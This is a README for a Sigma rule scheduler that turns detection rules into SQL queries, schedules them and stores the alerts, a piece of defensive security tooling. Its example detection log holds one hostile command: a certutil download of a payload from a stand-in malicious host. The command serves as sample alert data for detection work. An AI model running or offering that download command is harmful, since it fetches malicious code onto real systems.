# Sigma Rule Scheduler - Correlation System

This project is a modular system that:

- Fetches Sigma rules from local YAML files
- Maps them to specific index data sources
- Translates Sigma YAML into SQL queries
- Schedules and executes those queries
- Stores and displays detection results (alerts)

---

##  Components

### 1. `sigma_rules/`
Folder containing local `.yml` Sigma rules to ingest.

### 2. `models.py`
SQLAlchemy models defining the schema:
- `SigmaRuleSource`
- `SigmaRule`
- `SigmaRuleIndex`
- `SigmaRuleFieldMapping`
- `SigmaRuleExecution`
- `SigmaRuleExecutionResult`

### 3. `database.py`
Sets up the SQLAlchemy engine and session, with support for SQLite or PostgreSQL.

### 4. `sigma_rule_fetcher.py`
Scans the `sigma_rules/` folder, reads `.yml` files, and stores them in the database.

### 5. `sigma_rule_mapper.py`
Maps a stored Sigma rule to an index name and sets a schedule (cron-style).

### 6. `sigma_field_mapper.py`
Maps fields from the Sigma rule (e.g., `Image`) to the index schema (e.g., `process_path`).

### 7. `sigma_query_generator.py`
Parses the Sigma YAML and mapped fields, builds SQL queries, and stores them in `SigmaRuleIndex`.

### 8. `sigma_query_executor.py`
Runs the SQL queries, logs how many rows matched, and saves sample results in JSON format.

---

##  How to Run

1. **Activate the virtual environment**
```
./myenv/Scripts/activate
```

2. **Create the tables**
```bash
python -c "from sigma_scheduler.app.database import init_db; init_db()"
```

3. **Fetch local rules**
```bash
python run_fetcher.py
```

4. **Map rule to index**
```bash
python run_mapper.py
```

5. **Map Sigma fields to index fields**
```bash
python run_field_mapper.py
```

6. **Generate SQL query from rule**
```bash
python run_sql_generator.py
```

7. **Execute query and store results**
```bash
python run_executor.py
```

---

##  Output

- SQL queries stored in the DB (`SigmaRuleIndex.SQL_Query`)
- Alert results saved in `SigmaRuleExecutionResult.result_data`
- Execution log (number of matches, when it ran, etc.)

---

##  Requirements

```
fastapi
uvicorn
sqlalchemy
requests
yaml
pandas
```

Install them with:
```bash
pip install -r requirements.txt
```

---

##  Example Detection Log
```json
[
  {
    "timestamp": "2025-04-08 15:00:00",
    "host": "karas",
    "user": "george",
    "process_path": "C:\\Windows\\System32\\certutil.exe",
    "command": "certutil.exe -urlcache -split -f http://malicious.example.com/payload.exe"
  }
]
```

---

##  Notes

- Can be extended with a real scheduler (e.g. APScheduler, Celery)
- Can support REST API to interact with rule mappings and results
- Compatible with both SQLite and PostgreSQL

---



